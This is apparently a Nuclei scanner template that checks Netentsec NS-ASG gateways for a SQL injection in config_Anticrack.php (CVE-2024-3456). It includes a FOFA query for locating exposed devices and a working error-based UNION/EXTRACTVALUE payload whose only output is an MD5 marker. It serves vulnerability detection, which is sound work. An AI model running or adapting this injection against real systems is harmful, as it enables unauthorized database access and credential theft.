id: wangkang-NS-config_Anticrack_php-sql-CVE-2024-3456

info:
  name: "网康科技 NS-ASG config_Anticrack.php SQL注入漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: app="网康科技-NS-ASG安全网关"
    网康科技 NS-ASG 应用安全网关的 config_Anticrack.php 接口存在 SQL 注入安全缺陷。攻击者可通过构造恶意输入参数执行非授权的 SQL 查询，导致数据库敏感信息泄露（如管理员凭据、用户隐私数据）及数据库结构暴露。在具备特定权限条件下，该漏洞可能被链式利用实现操作系统命令注入，最终达成对目标服务器的完全控制。
  reference:
  - https://mp.weixin.qq.com/s/Cr2FTKxj5aSF44dZH9zUxQ
  tags: 网康科技-NS-ASG

http:
- raw:
  - |
    GET /admin/config_Anticrack.php?GroupId=1+UNION+ALL+SELECT+EXTRACTVALUE(1,concat(0x7e,(select+MD5(123123)),0x7e)) HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36

  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '~4297f44b13955235245b2497399d7a9'
  - type: status
    status:
    - 200
